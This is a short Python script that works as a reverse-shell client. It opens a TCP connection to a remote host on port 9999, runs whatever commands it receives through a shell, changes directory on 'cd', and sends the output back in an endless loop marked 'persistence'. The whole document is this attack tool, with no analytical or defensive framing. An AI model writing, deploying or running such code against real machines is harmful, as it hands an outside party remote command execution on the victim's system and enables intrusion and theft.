#!/usr/bin/env python
import socket, os, subprocess

def main():
	
	#declarations
	cSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	host = ''
	port = 9999

	#bind ((tuple,tuple))
	cSocket.connect((host, port))

	#persistence
	while True:
		
		data = cSocket.recv(1024)
		if data[:2].decode('utf-8') == 'cd':
			os.chdir(data[3:].decode('utf-8'))

		if len(data) > 0:
			cmd = subprocess.Popen(data[:].decode('utf-8'), shell = True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)

			output_byte = cmd.stdout.read() + cmd.stderr.read()
			output_str = str(output_byte)

			currentWD = os.getcwd() + "> "
			cSocket.send(str.encode(output_str + currentWD))

			print(output_str)
		

if __name__ == '__main__':
	main()
